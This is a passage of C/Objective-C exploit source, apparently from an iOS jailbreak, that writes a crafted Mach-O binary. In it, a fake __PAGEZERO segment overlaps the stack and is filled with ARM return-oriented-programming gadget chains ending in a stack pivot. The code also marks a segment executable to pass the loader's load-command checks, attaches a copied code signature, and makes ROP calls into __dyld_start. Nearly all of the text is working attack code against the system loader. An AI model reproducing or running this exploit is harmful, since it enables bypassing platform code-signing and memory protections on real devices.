                //enter_dyld2((vm_address_t)filedata2, [txtPath UTF8String], __dyld_start);
                RopCallDerefFunctionPointerStack8Deref1(PUSH, SEG_VAR(__dyld_start), 0, SEG_VAR(filedata2), -123, 1, SEG_VAR(a), 0, SEG_VAR(a), 0, SEG_VAR(a), 0);
                
                // no need on ROP, just call SYS_exit
                //munmap(filedata1, size);
                RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
                //ret=true;
            } else {
                NSLog(@"Cannot mmap()");
                exit(1);
            }
        } else {
            NSLog(@"Cannot fstat() file-descriptor");
            exit(1);
        }
        close(fd_local);
    } else {
        NSLog(@"Cannot open file");
        exit(1);
    }
    
    fsz += load_cmd_seg.filesize;
    
    /* __ROPDATA segment */
    
    load_cmd_seg.vmaddr = 0x52000000;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = round_page(sizeof(args_t)) + 0x1000;
    load_cmd_seg.vmsize = round_page(sizeof(args_t)) + 0x1000;
    strcpy(&load_cmd_seg.segname[0], "__ROPDATA");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    memcpy(buf + fsz, argss, sizeof(args_t));
    fsz += load_cmd_seg.filesize;
    
    /* segment overlap over the stack */
    
    load_cmd_seg.vmaddr = 0x110000; // overlap with stack
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.filesize = 0x100000;
    load_cmd_seg.vmsize = 0x100000;
    strcpy(&load_cmd_seg.segname[0], "__PAGEZERO"); // must be __PAGEZERO
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    stack = (uint32*)(buf + fsz);
    
    for (int n = 0; n < 0x100; n++) {
        for (int i = 0; i < 0x1000/4;) {
            
            stack[(n*0x1000/4) + (i++)] = pop_r7pc; // POP {R7,PC}
            stack[(n*0x1000/4) + (i++)] = pop_r4r7pc; // POP {R4,R7,PC}
        }
        int c = 0x3F0;
        stack[(n*0x1000/4) + (c++)] = pop_r4r7pc; // PC
        stack[(n*0x1000/4) + (c++)] = ( (n) << 12 ); // R4
        stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
        stack[(n*0x1000/4) + (c++)] = mov_r0_r4_pop_r4r7pc; // PC
        stack[(n*0x1000/4) + (c++)] = 0x52000000 - 8; // R4
        stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
        stack[(n*0x1000/4) + (c++)] = str_r0_r4_8_pop_r4r7pc; // PC
        stack[(n*0x1000/4) + (c++)] = 0x51000000 + STACK_OFFSET_BASE; // R4
        stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
        stack[(n*0x1000/4) + (c++)] = mov_sp_r4_pop_r4r7pc; // PC
        
    }
    fsz += load_cmd_seg.filesize;
    
    for (uint32_t *ins = stackbase; ins < stack; ins++) assert(*ins != INVALID_GADGET);
    
    load_cmd_seg.fileoff = 0;
    load_cmd_seg.filesize = (uint32_t)0x1000;
    load_cmd_seg.vmsize = (uint32_t)0x1000;
    load_cmd_seg.vmaddr = 0x4FF00000;
    load_cmd_seg.initprot = PROT_READ|PROT_EXEC; // must be EXEC to pass sniffLoadCommands
    load_cmd_seg.maxprot = PROT_READ|PROT_EXEC; // must be EXEC to pass sniffLoadCommands
    load_cmd_seg.cmd = LC_SEGMENT;
    load_cmd_seg.cmdsize = sizeof(load_cmd_seg);
    load_cmd_seg.flags = 0;
    load_cmd_seg.nsects = 0;
    strcpy(&load_cmd_seg.segname[0], "__LC_TEXT");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    fsz += load_cmd_seg.filesize;
    
    
    load_cmd_seg.initprot = PROT_READ;
    load_cmd_seg.maxprot = PROT_READ;
    load_cmd_seg.fileoff = fsz;
    load_cmd_seg.vmsize = 0x1000;
    load_cmd_seg.vmaddr = 0x50000000+g_data_vmsize+g_text_size+g_lnk_size+0x1000;
    load_cmd_seg.filesize = 0x1000;
    strcpy(&load_cmd_seg.segname[0], "__LINKEDIT");
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
    mh.sizeofcmds += load_cmd_seg.cmdsize;
    mh.ncmds++;
    fsz += load_cmd_seg.filesize;
    
    
    struct linkedit_data_command cs_cmd;
    
    cs_cmd.cmd = LC_CODE_SIGNATURE;
    cs_cmd.cmdsize = 16;
    cs_cmd.dataoff = fsz;
    cs_cmd.datasize = g_cs_size;
    
    memcpy(buf + mh.sizeofcmds + sizeof(mh), &cs_cmd, cs_cmd.cmdsize);
    mh.sizeofcmds += cs_cmd.cmdsize;
    mh.ncmds++;
    
    
    char *cs_data = (char*)(buf + fsz);
    memcpy(cs_data, g_cs_ptr, g_cs_size);
    fsz += cs_cmd.datasize;
    
    memcpy(buf, &mh, sizeof(mh));
    ftruncate(fd,fsz);
    return 0;
}
